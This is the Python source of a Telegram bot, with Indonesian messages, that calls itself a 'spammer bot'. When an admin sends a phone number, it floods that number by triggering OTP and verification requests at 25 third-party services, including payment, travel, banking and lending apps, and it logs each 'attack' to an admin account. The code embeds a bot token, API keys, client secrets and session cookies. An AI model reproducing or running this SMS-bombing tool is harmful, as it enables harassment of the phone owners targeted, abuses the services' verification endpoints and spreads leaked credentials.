# TELEGRAM BOT
from telegram.ext.updater import Updater
from telegram.update import Update
from telegram.ext.callbackcontext import CallbackContext
from telegram.ext.commandhandler import CommandHandler
from telegram.ext.messagehandler import MessageHandler
from telegram.ext.filters import Filters

# SPAMMER BOT
import os,sys,time,requests, json
from numpy import require
from time import sleep
from fake_useragent import UserAgent
from bs4 import BeautifulSoup as bs
import random
import string
import datetime
import pytz
ua = UserAgent()

# WAKTU INDONESIA (WIB)
dt = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))

  
updater = Updater("5329815334:AAHxG2ZlEsxMgZYx-uqIkRpAV0uEqW42zXk",
                  use_context=True)
  


# LIST ADMIN
admins = [854756142, 5014001714, 925204449]



# COOLDOWN
throttle_data = {
    'minutes': 1,
    'last_time': None
}

def throttle(func):
    def wrapper(*args, **kwargs):
        now = datetime.datetime.now()
        delta = now - datetime.timedelta(minutes=throttle_data.get('minutes', 30))
        last_time = throttle_data.get('last_time')
        if not last_time:
            last_time = delta

        if last_time <= delta:
            throttle_data['last_time'] = now
            func(*args, **kwargs)
        else:
            return not_allowed(*args)
    return wrapper


def not_allowed(update, context):
    update.message.reply_text(text="**SABAR BOSS PERINTAH NYA DELAY 1 MENIT**")

# COOLDOWN


def start(update: Update, context: CallbackContext):
    if update.message.from_user.id in admins:
        update.message.reply_text(
            f"===SPAMMER BOT BY HECKA===\n\nHalooo Boss Selamat Datang ^_^\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}")
    else:
        update.message.reply_text("MAAF ANDA SIAPA YAA???")
        context.bot.send_message(chat_id=854756142, text=f"! ADA PENYUSUP !\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}")


def help(update: Update, context: CallbackContext):
    if update.message.from_user.id in admins:
        update.message.reply_text("""Available Commands :-
        /spam [No Hp] - (Tidak Menggunakan Angka Awalan 0 atau +62)
        /help - List Perintah""")
    else:
        update.message.reply_text("MAAF ANDA SIAPA YAA???")
        context.bot.send_message(chat_id=854756142, text=f"! ADA PENYUSUP !\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}")
  


@throttle
def spam(update: Update, context: CallbackContext):
    if update.message.from_user.id in admins:
        nohp = ' '.join(context.args)
        if nohp == "82143012823":
            update.message.reply_text("MANA BISA GITU WOYY!!!")
            context.bot.send_message(chat_id=854756142, text=f"! SI TUKANG ISENG NOMOR LU !\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}")
            return
        if nohp.isdigit():
            if len(nohp) < 10 or len(nohp) > 14 or nohp.startswith("0") or nohp.startswith("62") or nohp.startswith("+62"):
                update.message.reply_text("NOMOR TELEPON TIDAK VALID!")
                return
            else:
                # FUNCTION SPAMMER

                def sp1():
                    hd = {'Host': 'api.payfazz.com', 'content-length': '17', 'accept': '*/*', 'origin': 'https://www.payfazz.com','user-agent': ua.random, 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'http://www.payfazz.com/register/BEN6ZF74XL', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                    r = requests.Session()
                    a = r.post('https://api.payfazz.com/v2/phoneVerifications', headers=hd, data={'phone':'0'+nohp})
                    if 'phoneVerificationId' in a.text:
                        update.message.reply_text("SPAMMING SUKSES [1] [STATUS => SIP MANTAB >:)")
                    else:
                        update.message.reply_text("ERROR SPAMMING [1] [STATUS => GAGAL NGAB :(")


                def sp2():
                    data = json.dumps({"phoneNumber":"+62"+nohp,"platform":"wa"})
                    r = requests.Session()
                    for x in range(1):
                        cal = r.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"content-type": "application/json","user-agent":ua.random},data=data).text
                        if '' in cal:
                            update.message.reply_text("SPAMMING SUKSES [2] [STATUS => SIP MANTAB >:)")
                        else:
                            update.message.reply_text("ERROR SPAMMING [2] [STATUS => GAGAL NGAB :(")

                def sp3():
                    r = requests.Session()
                    headers={
                        'x-requested-with':'XMLHttpRequest',
                        'User-Agent':ua.random ,
                        'Referer':'https://www.kelaspintar.id/',
                    }
                    dat = {
                        "user_mobile":nohp,
                        "otp_type":"send_otp_reg",
                        "mobile_code":"%2B62",
                    }
                    x = r.post('https://www.kelaspintar.id/user/otpverification',data=dat,headers=headers).text
                    if 'OTP send' in x:
                        update.message.reply_text("SPAMMING SUKSES [3] [STATUS => SIP MANTAB >:)")
                    else:
                        update.message.reply_text("ERROR SPAMMING [3] [STATUS => GAGAL NGAB :(")


                def sp4():
                    r = requests.Session()
                    r.headers.update({'referer':'https://www.alodokter.com/login-alodokter'})
                    hy = r.get("https://www.alodokter.com/login-alodokter")
                    tol = bs(hy.text,'html.parser')
                    token=tol.find('meta',{'name':'csrf-token'})['content']
                    hd = {
                    'user-agent':ua.random,
                    'content-type':'application/json',
                    'referer':'https://www.alodokter.com/login-alodokter',
                    'accept':'application/json',
                    'origin':'https://www.alodokter.com',
                    'x-csrf-token':token
                    }
                    y = r.post("https://www.alodokter.com/login-with-phone-number",headers=hd,json={"user":{"phone":"0"+nohp}})
                    if y.json()['status'] == 'success':
                        update.message.reply_text("SPAMMING SUKSES [4] [STATUS => SIP MANTAB >:)")
                    else:
                        update.message.reply_text("ERROR SPAMMING [4] [STATUS => GAGAL NGAB :(")


                def sp5():
                    hd = {
                    "Host": "api.myfave.com",
                    "Connection": "keep-alive",
                    "x-user-agent": "Fave-PWA/v1.0.0",
                    "User-Agent": ua.random,
                    "content-type": "application/json",
                    "Accept": "*/*",
                    "Origin": "https://m.myfave.com",
                    "Referer": "https://m.myfave.com/jakarta/auth",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }
                    dat = {'phone':'62'+nohp}
                    x = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=hd).text
                    if 'error' in x:
                        update.message.reply_text("ERROR SPAMMING [5] [STATUS => GAGAL NGAB :(")
                    else:
                        update.message.reply_text("SPAMMING SUKSES [5] [STATUS => SIP MANTAB >:)")


                def sp6():
                    head = {
                    "Host": "www.airbnb.co.id",
                    "content-length": "83",
                    "device-memory": "2",
                    "x-csrf-token": "V4$.airbnb.co.id$N_Kx2ju9iX8$gUBHaO73_UKCj4rDt2rHVNj7zvmZfOYgz38XKc9dzKw=",
                    "x-csrf-without-token": "1",
                    "user-agent": ua.random ,
                    "viewport-width": "360",
                    "content-type": "application/json",
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "cache-control": "no-cache",
                    "x-requested-with": "XMLHttpRequest",
                    "origin": "https://www.airbnb.co.id",
                    "referer": "https://www.airbnb.co.id/signup_login?redirect_url=/help",
                    }
                    dat = json.dumps({"phoneNumber": "62"+nohp,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"TEXT"})
                    for x in range(1):
                        cal = requests.post("https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id",data=dat,headers=head)
                        if 'internationalPhoneNumber' in cal.text:
                            update.message.reply_text("ERROR SPAMMING [6] [STATUS => GAGAL NGAB :(")
                        else:
                            update.message.reply_text("SPAMMING SUKSES [6] [STATUS => SIP MANTAB >:)")
    

                def sp7():
                    hd = {
                    "Host": "app.oneaset.co.id",
                    "Connection": "keep-alive",
                    "User-Agent": ua.random,
                    "content-type": "application/json",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "countryId": "1"
                    }
                    x = requests.get("https://app.oneaset.co.id/api/app/user/sms/captcha?phoneNumber=0"+nohp+"&imageCaptcha=&smsBizType=2",headers=hd)
                    if 'true' in x.text:
                        update.message.reply_text("SPAMMING SUKSES [7] [STATUS => SIP MANTAB >:)")  
                    else:
                        update.message.reply_text("ERROR SPAMMING [7] [STATUS => GAGAL NGAB :(")



                def sp8():
                    hd = {
                    'user-agent':ua.random
                    }
                    dat = {
                    'phone':nohp
                    }
                    r = requests.Session()
                    hyu = r.post("https://harvestcakes.com/register",headers=hd,data=dat)
                    if 'function' in hyu.text:
                        update.message.reply_text("SPAMMING SUKSES [8] [STATUS => SIP MANTAB >:)")  
                    else:
                        update.message.reply_text("ERROR SPAMMING [8] [STATUS => GAGAL NGAB :(")



                def sp9():
                    hd = {
                    'user-agent':ua.random
                    }
                    kil = requests.get("https://m.redbus.id/api/getOtp?number="+nohp+"&cc=62&whatsAppOpted=true", headers=hd).text
                    if 'OTP' in kil:
                        update.message.reply_text("SPAMMING SUKSES [9] [STATUS => SIP MANTAB >:)")  
                    else:
                        update.message.reply_text("ERROR SPAMMING [9] [STATUS => GAGAL NGAB :(")


                def sp10():
                    head = {
                    "accept": "*/*",
                    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
                    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
                    "user-agent": ua.random ,
                    "content-type": "application/json",
                    }
                    dat = json.dumps({
                        "grantType": "retry",
                        "method": "sms",
                        "phone": "+62"+nohp,
                        "language": "id"
                    })
                    r = requests.Session()
                    mampus = r.post("https://www.olx.co.id/api/auth/authenticate",data=dat,headers=head).text
                    if 'status' in mampus:
                        update.message.reply_text("SPAMMING SUKSES [10] [STATUS => SIP MANTAB >:)")  
                    else:
                        update.message.reply_text("ERROR SPAMMING [10] [STATUS => GAGAL NGAB :(")


                def sp11():
                    hd = {
                    "accept": "text/html, application/xhtml+xml, application/json, */*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-length": "166",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://h5.rupiahcepatweb.com",
                    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "user-agent": ua.random
                    }
                    url = 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code'
                    dit = {"mobile":"0"+nohp,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
                    dat = json.dumps(dit)
                    r = requests.Session()
                    a = r.post(url,headers=hd,data={"data":dat}).text
                    b = json.loads(a)["code"]
                    if b == 0:
                        update.message.reply_text("SPAMMING SUKSES [11] [STATUS => SIP MANTAB >:)")  
                    else:
                        update.message.reply_text("ERROR SPAMMING [11] [STATUS => GAGAL NGAB :(")


                def sp12():
                    r = requests.Session()
                    hd = {
                    'user-agent':ua.random ,
                    'Content-Type':'application/json',
                    }
                    dat = json.dumps({
                    'phone':'62'+nohp,
                    'api':2,
                    'email':'heckabots0012@gmail.com',
                    'x-email':'heckabotspam003@gmail.com',
                    })
                    yu = r.post("https://cloud.mail.ru/api/v2/notify/applink",headers=hd,data=dat)
                    if not 'error' in yu.text:
                        update.message.reply_text("SPAMMING SUKSES [12] [STATUS => SIP MANTAB >:)")  
                    else:
                        update.message.reply_text("ERROR SPAMMING [12] [STATUS => GAGAL NGAB :(")



                def sp13():
                    r = requests.Session()
                    hd = {'user-agent':ua.random}
                    dat = {'phone':'62'+nohp}
                    yu = r.post("https://youla.ru/web-api/auth/request_code",headers=hd,data=dat)
                    if not 'error' in yu.text:
                        update.message.reply_text("SPAMMING SUKSES [13] [STATUS => SIP MANTAB >:)")  
                    else:
                        update.message.reply_text("ERROR SPAMMING [13] [STATUS => GAGAL NGAB :(")



                def sp14():
                    r = requests.Session()
                    hd = {
                    "Host": "identity-gateway.oyorooms.com",
                    "consumer_host": "https://www.oyorooms.com",
                    "accept-language": "id",
                    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
                    "User-Agent": ua.random,
                    "Content-Type": "application/json",
                    "accept": "*/*",
                    "origin": "https://www.oyorooms.com",
                    "referer": "https://www.oyorooms.com/login",
                    "Accept-Encoding": "gzip, deflate, br",
                    }
                    dat=json.dumps({"phone":nohp,"country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"})
                    y = r.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",headers=hd,data=dat)
                    y1 = json.loads(y.text)["otp_sent"]
                    if y1 == True:
                        update.message.reply_text("SPAMMING SUKSES [14] [STATUS => SIP MANTAB >:)")  
                    else:
                        update.message.reply_text("ERROR SPAMMING [14] [STATUS => GAGAL NGAB :(")


                def sp15():
                    url = 'https://www.coowry.com/arlethdesign'
                    spam = 'https://www.coowry.com/api/tokens'
                    hd = {
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-length": "28",
                        "content-type": "application/json",
                        "origin": "https://www.coowry.com",
                        "referer": "https://www.coowry.com/arlethdesign",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": ua.random
                    }
                    target = {"msisdn":"+62"+nohp}
                    jsn = json.dumps(target)
                    r  = requests.Session()
                    a = r.get(url,headers={'user-agent':ua.random}).cookies
                    b = r.post(spam,headers=hd,cookies={'_cwpeople_keyle_key':a["_cwpeople_key"]},data=jsn).text
                    c = json.loads(b)["type"]
                    if 'ok' in c:
                        update.message.reply_text("SPAMMING SUKSES [15] [STATUS => SIP MANTAB >:)")  
                    else:
                        update.message.reply_text("ERROR SPAMMING [15] [STATUS => GAGAL NGAB :(")



                def sp16():
                    hd = {
                    "content-type": "application/json; charset=UTF-8",
                    "content-length": "34",
                    "accept-encoding": "gzip",
                    "user-agent": "okhttp/3.8.0",
                    "accept-language": "in",
                    "x-ada-token": "",
                    "x-ada-appid": "800006",
                    "x-ada-os": "android",
                    "x-ada-channel": "default",
                    "x-ada-mediasource": "",
                    "x-ada-agency": "adtubeagency",
                    "x-ada-campaign": "AdakamiCampaign",
                    "x-ada-role": "1",
                    "x-ada-appversion": "1.7.0",                                                                         "x-ada-device": "",
                    "x-ada-model": "SM-G935FD",
                    "x-ada-os-ver": "7.1.1",                                                                             "x-ada-androidid": "a4341a2sa90a4d97",
                    "x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39",
                    "x-ada-afid": "1580054114839-7395423911531673296",
                    }
                    dat = {"ketik":0,"nomor":"0"+nohp}
                    datjson = json.dumps(dat)
                    r = requests.Session()
                    a = r.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=datjson,headers=hd,timeout=10).text
                    if (a == '{"result":-1,"resultMessage":"Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok.","content":null}') or (a == '{"result":-1,"resultMessage":"Gagal","content":null}'):
                        update.message.reply_text("ERROR SPAMMING [16] [STATUS => GAGAL NGAB :(")
                    else:
                        update.message.reply_text("SPAMMING SUKSES [16] [STATUS => SIP MANTAB >:)")  



                def sp17():
                    req=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nohp}).text
                    if "terkirim" in req:
                        update.message.reply_text("SPAMMING SUKSES [17] [STATUS => SIP MANTAB >:)") 
                    else:
                        update.message.reply_text("ERROR SPAMMING [17] [STATUS => GAGAL NGAB :(")

    
                def sp18():
                    data= {'Host': 'id.jagreward.com','Connection': 'keep-alive','Accept': '*/*','X-Requested-With': 'XMLHttpRequest','Save-Data': 'on','User-Agent': ua.random,'Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://id.jagreward.com/member/register/','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'id-ID,id;q=0.9,en;q=0.8','Cookie': 'PHPSESSID=p8h80oleoevr9do7bor33t88up; _ga=GA1.3.1941571285.1641075863; DAPROPS="sjs.webGlRenderer:Adreno (TM) 505|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.6687500476837158|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _gid=GA1.3.1018949519.1646998248'}
                    gas = requests.get('https://id.jagreward.com/member/verify-mobile/'+nohp+'/',headers=data).text
                    if 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.' in gas:
                        update.message.reply_text("SPAMMING SUKSES [18] [STATUS => SIP MANTAB >:)") 
                    else:
                        update.message.reply_text("ERROR SPAMMING [18] [STATUS => GAGAL NGAB :(")
        

                def sp19():
                    dat = '{"code":0,"distinctId":"df857a37-421b-4a4f-ac61-6ed0e272537b","frequency":0,"phone":"%s"}'%nohp
                    hu = requests.post("https://api.kartuserba.com/appserver/v1/login/verificationCode",headers={'user-agent':ua.random,'content-type':'application/json; charset=UTF-8','channel-key':'GOOGLEPLAY'},data=dat)
                    if json.loads(hu.text)["errorCode"] == None:
                        update.message.reply_text("SPAMMING SUKSES [19] [STATUS => SIP MANTAB >:)") 
                    else:
                        update.message.reply_text("ERROR SPAMMING [19] [STATUS => GAGAL NGAB :(")



                def sp20():
                    hd={
                    'Host':'japi.maucash.id',
                    'accept':'application/json, text/plain, */*',
                    'x-origin':'google play',
                    'x-org-id':'1',
                    'x-product-code':'YN-MAUCASH',
                    'x-app-version':'2.4.23',
                    'x-source-id':'android',
                    'accept-encoding':'gzip',
                    'user-agent': ua.random
                    }
                    hu = requests.get("https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile=%s&channelType=0"%nohp,headers=hd)
                    if json.loads(hu.text)["message"] == 'Permintaan berhasil':
                        update.message.reply_text("SPAMMING SUKSES [20] [STATUS => SIP MANTAB >:)") 
                    else:
                        update.message.reply_text("ERROR SPAMMING [20] [STATUS => GAGAL NGAB :(")




                def sp21():
                    dat='{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}'%nohp
                    hd={
                    'LPR-TIMESTAMP':'1603281035821',
                    'Accept-Language':'id-ID',
                    'LPR-BRAND':'Kredito',
                    'LPR-PLATFORM':'android',
                    'User-Agent':ua.random,
                    'Authorization':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks',
                    'LPR-SIGNATURE':'e15dbea8602409df32a2ed5a123dc244',
                    'Content-Type':'application/json; charset=UTF-8',
                    'Content-Length':'79'
                    }
                    hy=requests.post("https://app-api.kredito.id/client/v1/common/verify-code/send",headers=hd,data=dat).text
                    if json.loads(hy)["msg"] == 'sukses':
                        update.message.reply_text("SPAMMING SUKSES [21] [STATUS => SIP MANTAB >:)") 
                    else:
                        update.message.reply_text("ERROR SPAMMING [21] [STATUS => GAGAL NGAB :(")




                def sp22():
                    wordlw = string.ascii_lowercase
                    digit = string.digits
                    emails = ''.join(random.choice(wordlw) for i in range(14))
                    names = ''.join(random.choice(wordlw) for i in range(10))
                    pw = ''.join(random.choice(wordlw) for i in range(5)) + ''.join(random.choice(digit) for i in range(5))
                    a=requests.get("https://www.matahari.com/customer/account/create/")
                    b=a.cookies["PHPSESSID"]
                    anj=requests.post("https://www.matahari.com/rest/V1/thorCustomers",data=json.dumps({"thor_customer":{"name":names,"card_number":False,"email_address":emails+"412@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":"0"+nohp,"mro":"","password":pw,"birth_date":"15/06/2000"}}),headers={"Host": "www.matahari.com","content-length": "245","x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=","x-requested-with": "XMLHttpRequest","user-agent": ua.random,"content-type": "application/json","accept": "*/*","referer": "https://www.matahari.com/customer/account/create/","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie": f"PHPSESSID={b}"}).text
                    if "Success" in anj:
                        update.message.reply_text("SPAMMING SUKSES [22] [STATUS => SIP MANTAB >:)") 
                    else:
                        update.message.reply_text("ERROR SPAMMING [22] [STATUS => GAGAL NGAB :(")




                def sp23():
                    rudal=requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nohp,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": ua.random}).text
                    if "registerPhone" in rudal:
                        update.message.reply_text("SPAMMING SUKSES [23] [STATUS => SIP MANTAB >:)") 
                    else:
                        update.message.reply_text("ERROR SPAMMING [23] [STATUS => GAGAL NGAB :(")




                def sp24():
                    d=requests.post("https://findclone.ru/register?phone=+62"+nohp,headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : ua.random}).json()
                    if "Wait for timeout" in d:
                        update.message.reply_text("ERROR SPAMMING [24] [STATUS => GAGAL NGAB :(")
                    else:
                        update.message.reply_text("SPAMMING SUKSES [24] [STATUS => SIP MANTAB >:)") 



            
                def sp25():
                    bw=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",data=json.dumps({"action":"LOGIN_OTP","clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn","countryCode":"62","deviceId":"baeab7ac-86d2-4c2a-ac1c-6392876c2930R","method":"SMS","phone": "0"+nohp}),headers={"Host":"api-v2.bukuwarung.com","accept":"application/json","x-app-version-name":"3.22.0","x-app-version-code":"4217","x-timezone":"Asia/Jakarta","authorization":"Bearer null","content-type":"application/json; charset=UTF-8","accept-encoding":"gzip","user-agent":ua.random}).text
                    if "OTP_SENT" in bw:
                        update.message.reply_text("SPAMMING SUKSES [25] [STATUS => SIP MANTAB >:)") 
                    else:
                        update.message.reply_text("ERROR SPAMMING [25] [STATUS => GAGAL NGAB :(")

            try:
                # FUNCTION SPAMMER
                context.bot.send_message(chat_id=854756142, text=f"LOG PENYERANGAN :\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}\n\nMELAKUKAN PENYERANGAN TERHADAP NOMOR => 0{nohp}\n\nTANGGAL | WAKTU : {dt.strftime('%d-%m-%Y | %H:%M:%S %Z %z')}")
                sleep(1)
                context.bot.send_message(chat_id=update.effective_chat.id, text=f"MEMULAI PENYERANGAN KE NOMOR TELEPON ==> 0{nohp}")
                sleep(1)
                update.message.reply_text("==============STARTING==============")
                sleep(1) 
                sp1()
                sleep(1)
                sp2()
                sleep(1)
                sp3()
                sleep(1)
                sp4()
                sleep(1)
                sp5()
                sleep(1)
                sp6()
                sleep(1)
                sp7()
                sleep(1)
                sp8()
                sleep(1)
                sp9()
                sleep(1)
                sp10()
                sleep(1)
                sp11()
                sleep(1)
                sp12()
                sleep(1)
                sp13()
                sleep(1)
                sp14()
                sleep(1)
                sp15()
                sleep(1)
                sp16()
                sleep(1)
                sp17()
                sleep(1)
                sp18()
                sleep(1)
                sp19()
                sleep(1)
                sp20()
                sleep(1)
                sp21()
                sleep(1)
                sp22()
                sleep(1)
                sp23()
                sleep(1)
                sp24()
                sleep(1)
                sp25()
                sleep(1)
                update.message.reply_text(f"===========SELESAI===========\n\nNOMOR TARGET => 0{nohp}")
            except:
                update.message.reply_text(f"! TERDAPAT ERROR SAAT MELAKUKAN PENYERANGAN TERHADAP NOMOR => 0{nohp} !")

        else:
            update.message.reply_text("MASUKKIN ANGKA BOSS, SEJAK KAPAN NOMOR TELEPON JADI HURUF??? :(")
    else:
        update.message.reply_text("MAAF ANDA SIAPA YAA???")

  

  
  
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('help', help))
updater.dispatcher.add_handler(CommandHandler('spam', spam))
  

  


print("BOT BERJALAN....")
updater.start_polling()


